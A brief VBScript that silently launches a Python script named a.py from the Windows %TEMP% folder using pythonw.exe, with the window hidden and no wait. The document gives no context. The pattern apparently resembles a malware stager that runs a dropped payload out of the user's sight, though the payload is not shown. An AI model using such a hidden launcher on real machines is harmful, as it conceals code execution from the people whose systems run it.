Set objShell = CreateObject("WScript.Shell")
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\a.py"
pythonPath = objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Programs\Python\Python313\pythonw.exe"
objShell.Run """" & pythonPath & """ """ & tempPath & """", 0, False
